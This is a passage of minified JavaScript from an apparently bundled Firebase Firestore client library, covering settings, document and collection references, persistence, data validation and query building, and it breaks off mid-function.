 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class VS{constructor(e){var t;if(void 0===e.host){if(void 0!==e.ssl)throw new L(M.INVALID_ARGUMENT,"Can't provide ssl option if host option is not set");this.host="firestore.googleapis.com",this.ssl=!0}else this.host=e.host,this.ssl=null===(t=e.ssl)||void 0===t||t;if(this.credentials=e.credentials,this.ignoreUndefinedProperties=!!e.ignoreUndefinedProperties,this.cache=e.localCache,void 0===e.cacheSizeBytes)this.cacheSizeBytes=41943040;else{if(-1!==e.cacheSizeBytes&&e.cacheSizeBytes<1048576)throw new L(M.INVALID_ARGUMENT,"cacheSizeBytes must be at least 1048576");this.cacheSizeBytes=e.cacheSizeBytes}bI("experimentalForceLongPolling",e.experimentalForceLongPolling,"experimentalAutoDetectLongPolling",e.experimentalAutoDetectLongPolling),this.experimentalForceLongPolling=!!e.experimentalForceLongPolling,this.experimentalForceLongPolling||void 0===e.experimentalAutoDetectLongPolling?this.experimentalAutoDetectLongPolling=!1:this.experimentalAutoDetectLongPolling=!!e.experimentalAutoDetectLongPolling,this.useFetchStreams=!!e.useFetchStreams}isEqual(e){return this.host===e.host&&this.ssl===e.ssl&&this.credentials===e.credentials&&this.cacheSizeBytes===e.cacheSizeBytes&&this.experimentalForceLongPolling===e.experimentalForceLongPolling&&this.experimentalAutoDetectLongPolling===e.experimentalAutoDetectLongPolling&&this.ignoreUndefinedProperties===e.ignoreUndefinedProperties&&this.useFetchStreams===e.useFetchStreams}}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ju{constructor(e,t,n,r){this._authCredentials=e,this._appCheckCredentials=t,this._databaseId=n,this._app=r,this.type="firestore-lite",this._persistenceKey="(lite)",this._settings=new VS({}),this._settingsFrozen=!1}get app(){if(!this._app)throw new L(M.FAILED_PRECONDITION,"Firestore was not initialized using the Firebase SDK. 'app' is not available");return this._app}get _initialized(){return this._settingsFrozen}get _terminated(){return void 0!==this._terminateTask}_setSettings(e){if(this._settingsFrozen)throw new L(M.FAILED_PRECONDITION,"Firestore has already been started and its settings can no longer be changed. You can only modify settings before calling any other methods on a Firestore object.");this._settings=new VS(e),void 0!==e.credentials&&(this._authCredentials=function(e){if(!e)return new B4;switch(e.type){case"firstParty":return new W4(e.sessionIndex||"0",e.iamToken||null,e.authTokenFactory||null);case"provider":return e.client;default:throw new L(M.INVALID_ARGUMENT,"makeAuthCredentialsProvider failed due to invalid credential type")}}(e.credentials))}_getSettings(){return this._settings}_freezeSettings(){return this._settingsFrozen=!0,this._settings}_delete(){return this._terminateTask||(this._terminateTask=this._terminate()),this._terminateTask}toJSON(){return{app:this._app,databaseId:this._databaseId,settings:this._settings}}_terminate(){return function(e){const t=$S.get(e);t&&(V("ComponentProvider","Removing Datastore"),$S.delete(e),t.terminate())}(this),Promise.resolve()}}function jF(e,t,n,r={}){var i;const s=(e=ke(e,ju))._getSettings();if("firestore.googleapis.com"!==s.host&&s.host!==t&&sr("Host has been set in both settings() and useEmulator(), emulator host will be used"),e._setSettings(Object.assign(Object.assign({},s),{host:`${t}:${n}`,ssl:!1})),r.mockUserToken){let t,n;if("string"==typeof r.mockUserToken)t=r.mockUserToken,n=bt.MOCK_USER;else{t=oO(r.mockUserToken,null===(i=e._app)||void 0===i?void 0:i.options.projectId);const s=r.mockUserToken.sub||r.mockUserToken.user_id;if(!s)throw new L(M.INVALID_ARGUMENT,"mockUserToken must contain 'sub' or 'user_id' field!");n=new bt(s)}e._authCredentials=new j4(new YT(t,n))}}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ke{constructor(e,t,n){this.converter=t,this._key=n,this.type="document",this.firestore=e}get _path(){return this._key.path}get id(){return this._key.path.lastSegment()}get path(){return this._key.path.canonicalString()}get parent(){return new wr(this.firestore,this.converter,this._key.path.popLast())}withConverter(e){return new Ke(this.firestore,e,this._key)}}class Kt{constructor(e,t,n){this.converter=t,this._query=n,this.type="query",this.firestore=e}withConverter(e){return new Kt(this.firestore,e,this._query)}}class wr extends Kt{constructor(e,t,n){super(e,t,Ea(n)),this._path=n,this.type="collection"}get id(){return this._query.path.lastSegment()}get path(){return this._query.path.canonicalString()}get parent(){const e=this._path.popLast();return e.isEmpty()?null:new Ke(this.firestore,null,new B(e))}withConverter(e){return new wr(this.firestore,e,this._path)}}function PI(e,t,...n){if(e=Et(e),Vv("collection","path",t),e instanceof ju){const r=Te.fromString(t,...n);return FS(r),new wr(e,null,r)}{if(!(e instanceof Ke||e instanceof wr))throw new L(M.INVALID_ARGUMENT,"Expected first argument to collection() to be a CollectionReference, a DocumentReference or FirebaseFirestore");const r=e._path.child(Te.fromString(t,...n));return FS(r),new wr(e.firestore,null,r)}}function qF(e,t){if(e=ke(e,ju),Vv("collectionGroup","collection id",t),t.indexOf("/")>=0)throw new L(M.INVALID_ARGUMENT,`Invalid collection ID '${t}' passed to function collectionGroup(). Collection IDs must not contain '/'.`);return new Kt(e,null,(n=t,new Jr(Te.emptyPath(),n)));var n}function sd(e,t,...n){if(e=Et(e),1===arguments.length&&(t=WT.A()),Vv("doc","path",t),e instanceof ju){const r=Te.fromString(t,...n);return LS(r),new Ke(e,null,new B(r))}{if(!(e instanceof Ke||e instanceof wr))throw new L(M.INVALID_ARGUMENT,"Expected first argument to collection() to be a CollectionReference, a DocumentReference or FirebaseFirestore");const r=e._path.child(Te.fromString(t,...n));return LS(r),new Ke(e.firestore,e instanceof wr?e.converter:null,new B(r))}}function $I(e,t){return e=Et(e),t=Et(t),(e instanceof Ke||e instanceof wr)&&(t instanceof Ke||t instanceof wr)&&e.firestore===t.firestore&&e.path===t.path&&e.converter===t.converter}function LI(e,t){return e=Et(e),t=Et(t),e instanceof Kt&&t instanceof Kt&&e.firestore===t.firestore&&$u(e._query,t._query)&&e.converter===t.converter}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class YF{constructor(){this.Kc=Promise.resolve(),this.Gc=[],this.Qc=!1,this.jc=[],this.zc=null,this.Wc=!1,this.Hc=!1,this.Jc=[],this.Lo=new Sv(this,"async_queue_retry"),this.Yc=()=>{const e=sh();e&&V("AsyncQueue","Visibility state changed to "+e.visibilityState),this.Lo.ko()};const e=sh();e&&"function"==typeof e.addEventListener&&e.addEventListener("visibilitychange",this.Yc)}get isShuttingDown(){return this.Qc}enqueueAndForget(e){this.enqueue(e)}enqueueAndForgetEvenWhileRestricted(e){this.Xc(),this.Zc(e)}enterRestrictedMode(e){if(!this.Qc){this.Qc=!0,this.Hc=e||!1;const t=sh();t&&"function"==typeof t.removeEventListener&&t.removeEventListener("visibilitychange",this.Yc)}}enqueue(e){if(this.Xc(),this.Qc)return new Promise((()=>{}));const t=new Pt;return this.Zc((()=>this.Qc&&this.Hc?Promise.resolve():(e().then(t.resolve,t.reject),t.promise))).then((()=>t.promise))}enqueueRetryable(e){this.enqueueAndForget((()=>(this.Gc.push(e),this.ta())))}async ta(){if(0!==this.Gc.length){try{await this.Gc[0](),this.Gc.shift(),this.Lo.reset()}catch(e){if(!Xi(e))throw e;V("AsyncQueue","Operation failed with retryable error: "+e)}this.Gc.length>0&&this.Lo.xo((()=>this.ta()))}}Zc(e){const t=this.Kc.then((()=>(this.Wc=!0,e().catch((e=>{this.zc=e,this.Wc=!1;throw mt("INTERNAL UNHANDLED ERROR: ",function(e){let t=e.message||"";return e.stack&&(t=e.stack.includes(e.message)?e.stack:e.message+"\n"+e.stack),t}(e)),e})).then((e=>(this.Wc=!1,e))))));return this.Kc=t,t}enqueueAfterDelay(e,t,n){this.Xc(),this.Jc.indexOf(e)>-1&&(t=0);const r=xv.createAndSchedule(this,e,t,n,(e=>this.ea(e)));return this.jc.push(r),r}Xc(){this.zc&&G()}verifyOperationInProgress(){}async na(){let e;do{e=this.Kc,await e}while(e!==this.Kc)}sa(e){for(const t of this.jc)if(t.timerId===e)return!0;return!1}ia(e){return this.na().then((()=>{this.jc.sort(((e,t)=>e.targetTimeMs-t.targetTimeMs));for(const t of this.jc)if(t.skipDelay(),"all"!==e&&t.timerId===e)break;return this.na()}))}ra(e){this.Jc.push(e)}ea(e){const t=this.jc.indexOf(e);this.jc.splice(t,1)}}function yg(e){return function(e,t){if("object"!=typeof e||null===e)return!1;const n=e;for(const e of["next","error","complete"])if(e in n&&"function"==typeof n[e])return!0;return!1}(e)}class WF{constructor(){this._progressObserver={},this._taskCompletionResolver=new Pt,this._lastProgress={taskState:"Running",totalBytes:0,totalDocuments:0,bytesLoaded:0,documentsLoaded:0}}onProgress(e,t,n){this._progressObserver={next:e,error:t,complete:n}}catch(e){return this._taskCompletionResolver.promise.catch(e)}then(e,t){return this._taskCompletionResolver.promise.then(e,t)}_completeWith(e){this._updateProgress(e),this._progressObserver.complete&&this._progressObserver.complete(),this._taskCompletionResolver.resolve(e)}_failWith(e){this._lastProgress.taskState="Error",this._progressObserver.next&&this._progressObserver.next(this._lastProgress),this._progressObserver.error&&this._progressObserver.error(e),this._taskCompletionResolver.reject(e)}_updateProgress(e){this._lastProgress=e,this._progressObserver.next&&this._progressObserver.next(e)
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */}}const GF=-1;class ht extends ju{constructor(e,t,n,r){super(e,t,n,r),this.type="firestore",this._queue=new YF,this._persistenceKey=(null==r?void 0:r.name)||"[DEFAULT]"}_terminate(){return this._firestoreClient||FI(this),this._firestoreClient.terminate()}}function Vt(e){return e._firestoreClient||FI(e),e._firestoreClient.verifyNotTerminated(),e._firestoreClient}function FI(e){var t,n,r;const i=e._freezeSettings(),s=(o=e._databaseId,a=(null===(t=e._app)||void 0===t?void 0:t.options.appId)||"",l=e._persistenceKey,new E$(o,a,l,(u=i).host,u.ssl,u.experimentalForceLongPolling,u.experimentalAutoDetectLongPolling,u.useFetchStreams));var o,a,l,u;e._firestoreClient=new OF(e._authCredentials,e._appCheckCredentials,e._queue,s),null!==(n=i.cache)&&void 0!==n&&n._offlineComponentProvider&&null!==(r=i.cache)&&void 0!==r&&r._onlineComponentProvider&&(e._firestoreClient._uninitializedComponentsProvider={_offlineKind:i.cache.kind,_offline:i.cache._offlineComponentProvider,_online:i.cache._onlineComponentProvider})}function HF(e,t){UI(e=ke(e,ht));const n=Vt(e);if(n._uninitializedComponentsProvider)throw new L(M.FAILED_PRECONDITION,"SDK cache is already specified.");sr("enableIndexedDbPersistence() will be deprecated in the future, you can use `FirestoreSettings.cache` instead.");const r=e._freezeSettings(),i=new Pv;return VI(n,i,new DI(i,r.cacheSizeBytes,null==t?void 0:t.forceOwnership))}function KF(e){UI(e=ke(e,ht));const t=Vt(e);if(t._uninitializedComponentsProvider)throw new L(M.FAILED_PRECONDITION,"SDK cache is already specified.");sr("enableMultiTabIndexedDbPersistence() will be deprecated in the future, you can use `FirestoreSettings.cache` instead.");const n=e._freezeSettings(),r=new Pv;return VI(t,r,new MF(r,n.cacheSizeBytes))}function VI(e,t,n){const r=new Pt;return e.asyncQueue.enqueue((async()=>{try{await oh(e,n),await gg(e,t),r.resolve()}catch(e){const t=e;if(!CI(t))throw t;sr("Error enabling indexeddb cache. Falling back to memory cache: "+t),r.reject(t)}})).then((()=>r.promise))}function QF(e){if(e._initialized&&!e._terminated)throw new L(M.FAILED_PRECONDITION,"Persistence can only be cleared before a Firestore instance is initialized or after it is terminated.");const t=new Pt;return e._queue.enqueueAndForgetEvenWhileRestricted((async()=>{try{await async function(e){if(!er.D())return Promise.resolve();const t=e+"main";await er.delete(t)}(yv(e._databaseId,e._persistenceKey)),t.resolve()}catch(e){t.reject(e)}})),t.promise}function XF(e){return function(e){const t=new Pt;return e.asyncQueue.enqueueAndForget((async()=>vF(await Fv(e),t))),t.promise}(Vt(e=ke(e,ht)))}function JF(e){return $F(Vt(e=ke(e,ht)))}function ZF(e){return LF(Vt(e=ke(e,ht)))}function e9(e,t){const n=Vt(e=ke(e,ht)),r=new WF;return zF(n,e._databaseId,t,r),r}function t9(e,t){return BF(Vt(e=ke(e,ht)),t).then((t=>t?new Kt(e,null,t.query):null))}function UI(e){if(e._initialized||e._terminated)throw new L(M.FAILED_PRECONDITION,"Firestore has already been started and persistence can no longer be enabled. You can only enable persistence before calling any other methods on a Firestore object.")}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class _r{constructor(e){this._byteString=e}static fromBase64String(e){try{return new _r(Ct.fromBase64String(e))}catch(e){throw new L(M.INVALID_ARGUMENT,"Failed to construct data from Base64 string: "+e)}}static fromUint8Array(e){return new _r(Ct.fromUint8Array(e))}toBase64(){return this._byteString.toBase64()}toUint8Array(){return this._byteString.toUint8Array()}toString(){return"Bytes(base64: "+this.toBase64()+")"}isEqual(e){return this._byteString.isEqual(e._byteString)}}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ji{constructor(...e){for(let t=0;t<e.length;++t)if(0===e[t].length)throw new L(M.INVALID_ARGUMENT,"Invalid field name at argument $(i + 1). Field names must not be empty.");this._internalPath=new gt(e)}isEqual(e){return this._internalPath.isEqual(e._internalPath)}}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class to{constructor(e){this._methodName=e}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class nf{constructor(e,t){if(!isFinite(e)||e<-90||e>90)throw new L(M.INVALID_ARGUMENT,"Latitude must be a number between -90 and 90, but was: "+e);if(!isFinite(t)||t<-180||t>180)throw new L(M.INVALID_ARGUMENT,"Longitude must be a number between -180 and 180, but was: "+t);this._lat=e,this._long=t}get latitude(){return this._lat}get longitude(){return this._long}isEqual(e){return this._lat===e._lat&&this._long===e._long}toJSON(){return{latitude:this._lat,longitude:this._long}}_compareTo(e){return ue(this._lat,e._lat)||ue(this._long,e._long)}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const n9=/^__.*__$/;class r9{constructor(e,t,n){this.data=e,this.fieldMask=t,this.fieldTransforms=n}toMutation(e,t){return null!==this.fieldMask?new Zr(e,this.data,this.fieldMask,t,this.fieldTransforms):new Ta(e,this.data,t,this.fieldTransforms)}}class zI{constructor(e,t,n){this.data=e,this.fieldMask=t,this.fieldTransforms=n}toMutation(e,t){return new Zr(e,this.data,this.fieldMask,t,this.fieldTransforms)}}function BI(e){switch(e){case 0:case 2:case 1:return!0;case 3:case 4:return!1;default:throw G()}}class rf{constructor(e,t,n,r,i,s){this.settings=e,this.databaseId=t,this.serializer=n,this.ignoreUndefinedProperties=r,void 0===i&&this.oa(),this.fieldTransforms=i||[],this.fieldMask=s||[]}get path(){return this.settings.path}get ua(){return this.settings.ua}ca(e){return new rf(Object.assign(Object.assign({},this.settings),e),this.databaseId,this.serializer,this.ignoreUndefinedProperties,this.fieldTransforms,this.fieldMask)}aa(e){var t;const n=null===(t=this.path)||void 0===t?void 0:t.child(e),r=this.ca({path:n,ha:!1});return r.la(e),r}fa(e){var t;const n=null===(t=this.path)||void 0===t?void 0:t.child(e),r=this.ca({path:n,ha:!1});return r.oa(),r}da(e){return this.ca({path:void 0,ha:!0})}_a(e){return od(e,this.settings.methodName,this.settings.wa||!1,this.path,this.settings.ma)}contains(e){return void 0!==this.fieldMask.find((t=>e.isPrefixOf(t)))||void 0!==this.fieldTransforms.find((t=>e.isPrefixOf(t.field)))}oa(){if(this.path)for(let e=0;e<this.path.length;e++)this.la(this.path.get(e))}la(e){if(0===e.length)throw this._a("Document fields must not be empty");if(BI(this.ua)&&n9.test(e))throw this._a('Document fields cannot begin and end with "__"')}}class i9{constructor(e,t,n){this.databaseId=e,this.ignoreUndefinedProperties=t,this.serializer=n||zu(e)}ga(e,t,n,r=!1){return new rf({ua:e,methodName:t,ma:n,path:gt.emptyPath(),ha:!1,wa:r},this.databaseId,this.serializer,this.ignoreUndefinedProperties)}}function no(e){const t=e._freezeSettings(),n=zu(e._databaseId);return new i9(e._databaseId,!!t.ignoreUndefinedProperties,n)}function sf(e,t,n,r,i,s={}){const o=e.ga(s.merge||s.mergeFields?2:0,t,n,i);jv("Data must be an object, but it was:",o,r);const a=YI(r,o);let l,u;if(s.merge)l=new Sn(o.fieldMask),u=o.fieldTransforms;else if(s.mergeFields){const e=[];for(const r of s.mergeFields){const i=vg(t,r,n);if(!o.contains(i))throw new L(M.INVALID_ARGUMENT,`Field '${i}' is specified in your field mask but missing from your input data.`);GI(e,i)||e.push(i)}l=new Sn(e),u=o.fieldTransforms.filter((e=>l.covers(e.field)))}else l=null,u=o.fieldTransforms;return new r9(new Yt(a),l,u)}class qu extends to{_toFieldTransform(e){if(2!==e.ua)throw 1===e.ua?e._a(`${this._methodName}() can only appear at the top level of your update data`):e._a(`${this._methodName}() cannot be used with set() unless you pass {merge:true}`);return e.fieldMask.push(e.path),null}isEqual(e){return e instanceof qu}}function jI(e,t,n){return new rf({ua:3,ma:t.settings.ma,methodName:e._methodName,ha:n},t.databaseId,t.serializer,t.ignoreUndefinedProperties)}class Uv extends to{_toFieldTransform(e){return new Fu(e.path,new aa)}isEqual(e){return e instanceof Uv}}class s9 extends to{constructor(e,t){super(e),this.ya=t}_toFieldTransform(e){const t=jI(this,e,!0),n=this.ya.map((e=>ro(e,t))),r=new Bs(n);return new Fu(e.path,r)}isEqual(e){return this===e}}class o9 extends to{constructor(e,t){super(e),this.ya=t}_toFieldTransform(e){const t=jI(this,e,!0),n=this.ya.map((e=>ro(e,t))),r=new js(n);return new Fu(e.path,r)}isEqual(e){return this===e}}class a9 extends to{constructor(e,t){super(e),this.pa=t}_toFieldTransform(e){const t=new la(e.serializer,xx(e.serializer,this.pa));return new Fu(e.path,t)}isEqual(e){return this===e}}function zv(e,t,n,r){const i=e.ga(1,t,n);jv("Data must be an object, but it was:",i,r);const s=[],o=Yt.empty();eo(r,((e,r)=>{const a=qv(t,e,n);r=Et(r);const l=i.fa(a);if(r instanceof qu)s.push(a);else{const e=ro(r,l);null!=e&&(s.push(a),o.set(a,e))}}));const a=new Sn(s);return new zI(o,a,i.fieldTransforms)}function Bv(e,t,n,r,i,s){const o=e.ga(1,t,n),a=[vg(t,r,n)],l=[i];if(s.length%2!=0)throw new L(M.INVALID_ARGUMENT,`Function ${t}() needs to be called with an even number of arguments that alternate between field names and values.`);for(let e=0;e<s.length;e+=2)a.push(vg(t,s[e])),l.push(s[e+1]);const u=[],c=Yt.empty();for(let e=a.length-1;e>=0;--e)if(!GI(u,a[e])){const t=a[e];let n=l[e];n=Et(n);const r=o.fa(t);if(n instanceof qu)u.push(t);else{const e=ro(n,r);null!=e&&(u.push(t),c.set(t,e))}}const h=new Sn(u);return new zI(c,h,o.fieldTransforms)}function qI(e,t,n,r=!1){return ro(n,e.ga(r?4:3,t))}function ro(e,t){if(WI(e=Et(e)))return jv("Unsupported field value:",t,e),YI(e,t);if(e instanceof to)return function(e,t){if(!BI(t.ua))throw t._a(`${e._methodName}() can only be used with update() and set()`);if(!t.path)throw t._a(`${e._methodName}() is not currently supported inside arrays`);const n=e._toFieldTransform(t);n&&t.fieldTransforms.push(n)}(e,t),null;if(void 0===e&&t.ignoreUndefinedProperties)return null;if(t.path&&t.fieldMask.push(t.path),e instanceof Array){if(t.settings.ha&&4!==t.ua)throw t._a("Nested arrays are not supported");return function(e,t){const n=[];let r=0;for(const i of e){let e=ro(i,t.da(r));null==e&&(e={nullValue:"NULL_VALUE"}),n.push(e),r++}return{arrayValue:{values:n}}}(e,t)}return function(e,t){if(null===(e=Et(e)))return{nullValue:"NULL_VALUE"};if("number"==typeof e)return xx(t.serializer,e);if("boolean"==typeof e)return{booleanValue:e};if("string"==typeof e)return{stringValue:e};if(e instanceof Date){const n=et.fromDate(e);return{timestampValue:ua(t.serializer,n)}}if(e instanceof et){const n=new et(e.seconds,1e3*Math.floor(e.nanoseconds/1e3));return{timestampValue:ua(t.serializer,n)}}if(e instanceof nf)return{geoPointValue:{latitude:e.latitude,longitude:e.longitude}};if(e instanceof _r)return{bytesValue:$x(t.serializer,e._byteString)};if(e instanceof Ke){const n=t.databaseId,r=e.firestore._databaseId;if(!r.isEqual(n))throw t._a(`Document reference is for database ${r.projectId}/${r.database} but should be for database ${n.projectId}/${n.database}`);return{referenceValue:hv(e.firestore._databaseId||t.databaseId,e._key.path)}}throw t._a(`Unsupported field value: ${tf(e)}`)}(e,t)}function YI(e,t){const n={};return ix(e)?t.path&&t.path.length>0&&t.fieldMask.push(t.path):eo(e,((e,r)=>{const i=ro(r,t.aa(e));null!=i&&(n[e]=i)})),{mapValue:{fields:n}}}function WI(e){return!("object"!=typeof e||null===e||e instanceof Array||e instanceof Date||e instanceof et||e instanceof nf||e instanceof _r||e instanceof Ke||e instanceof to)}function jv(e,t,n){if(!WI(n)||("object"!=typeof(r=n)||null===r||Object.getPrototypeOf(r)!==Object.prototype&&null!==Object.getPrototypeOf(r))){const r=tf(n);throw"an object"===r?t._a(e+" a custom object"):t._a(e+" "+r)}var r}function vg(e,t,n){if((t=Et(t))instanceof ji)return t._internalPath;if("string"==typeof t)return qv(e,t);throw od("Field path arguments must be of type string or ",e,!1,void 0,n)}const l9=new RegExp("[~\\*/\\[\\]]");function qv(e,t,n){if(t.search(l9)>=0)throw od(`Invalid field path (${t}). Paths must not contain '~', '*', '/', '[', or ']'`,e,!1,void 0,n);try{return new ji(...t.split("."))._internalPath}catch{throw od(`Invalid field path (${t}). Paths must not be empty, begin with '.', end with '.', or contain '..'`,e,!1,void 0,n)}}function od(e,t,n,r,i){const s=r&&!r.isEmpty(),o=void 0!==i;let a=`Function ${t}() called with invalid data`;n&&(a+=" (via `toFirestore()`)"),a+=". ";let l="";return(s||o)&&(l+=" (found",s&&(l+=` in field ${r}`),o&&(l+=` in document ${i}`),l+=")"),new L(M.INVALID_ARGUMENT,a+e+l)}function GI(e,t){return e.some((e=>e.isEqual(t)))}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class fu{constructor(e,t,n,r,i){this._firestore=e,this._userDataWriter=t,this._key=n,this._document=r,this._converter=i}get id(){return this._key.path.lastSegment()}get ref(){return new Ke(this._firestore,this._converter,this._key)}exists(){return null!==this._document}data(){if(this._document){if(this._converter){const e=new u9(this._firestore,this._userDataWriter,this._key,this._document,null);return this._converter.fromFirestore(e)}return this._userDataWriter.convertValue(this._document.data.value)}}get(e){if(this._document){const t=this._document.data.field(of("DocumentSnapshot.get",e));if(null!==t)return this._userDataWriter.convertValue(t)}}}class u9 extends fu{data(){return super.data()}}function of(e,t){return"string"==typeof t?qv(e,t):t instanceof ji?t._internalPath:t._delegate._internalPath}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function HI(e){if("L"===e.limitType&&0===e.explicitOrderBy.length)throw new L(M.UNIMPLEMENTED,"limitToLast() queries require specifying at least one orderBy() clause")}class Yv{}class Yu extends Yv{}function ui(e,t,...n){let r=[];t instanceof Yv&&r.push(t),r=r.concat(n),function(e){const t=e.filter((e=>e instanceof Wv)).length,n=e.filter((e=>e instanceof af)).length;if(t>1||t>0&&n>0)throw new L(M.INVALID_ARGUMENT,"InvalidQuery. When using composite filters, you cannot use more than one filter at the top level. Consider nesting the multiple filters within an `and(...)` statement. For example: change `query(query, where(...), or(...))` to `query(query, and(where(...), or(...)))`.")}(r);for(const t of r)e=t._apply(e);return e}class af extends Yu{constructor(e,t,n){super(),this._field=e,this._op=t,this._value=n,this.type="where"}static _create(e,t,n){return new af(e,t,n)}_apply(e){const t=this._parse(e);return QI(e._query,t),new Kt(e.firestore,e.converter,ig(e._query,t))}_parse(e){const t=no(e.firestore);return function(e,t,n,r,i,s,o){let a;if(i.isKeyField()){if("array-contains"===s||"array-contains-any"===s)throw new L(M.INVALID_ARGUMENT,`Invalid Query. You can't perform '${s}' queries on documentId().`);if("in"===s||"not-in"===s){zS(o,s);const t=[];for(const n of o)t.push(US(r,e,n));a={arrayValue:{values:t}}}else a=US(r,e,o)}else"in"!==s&&"not-in"!==s&&"array-contains-any"!==s||zS(o,s),a=qI(n,"where",o,"in"===s||"not-in"===s);return ye.create(i,s,a)}(e._query,0,t,e.firestore._databaseId,this._field,this._op,this._value)}}function c9(e,t,n){const r=t,i=of("where",e);return af._create(i,r,n)}class Wv extends Yv{constructor(e,t){super(),this.type=e,this._queryConstraints=t}static _create(e,t){return new Wv(e,t)}_parse(e){const t=this._queryConstraints.map((t=>t._parse(e))).filter((e=>e.getFilters().length>0));return 1===t.length?t[0]:Ae.create(t,this._getOperator())}_apply(e){const t=this._parse(e);return 0===t.getFilters().length?e:(function(e,t){let n=e;const r=t.getFlattenedFilters();for(const e of r)QI(n,e),n=ig(n,e)}(e._query,t),new Kt(e.firestore,e.converter,ig(e._query,t)))}_getQueryConstraints(){return this._queryConstraints}_getOperator(){return"and"===this.type?"and":"or"}}class Gv extends Yu{constructor(e,t){super(),this._field=e,this._direction=t,this.type="orderBy"}static _create(e,t){return new Gv(e,t)}_apply(e){const t=function(e,t,n){if(null!==e.startAt)throw new L(M.INVALID_ARGUMENT,"Invalid query. You must not call startAt() or startAfter() before calling orderBy().");if(null!==e.endAt)throw new 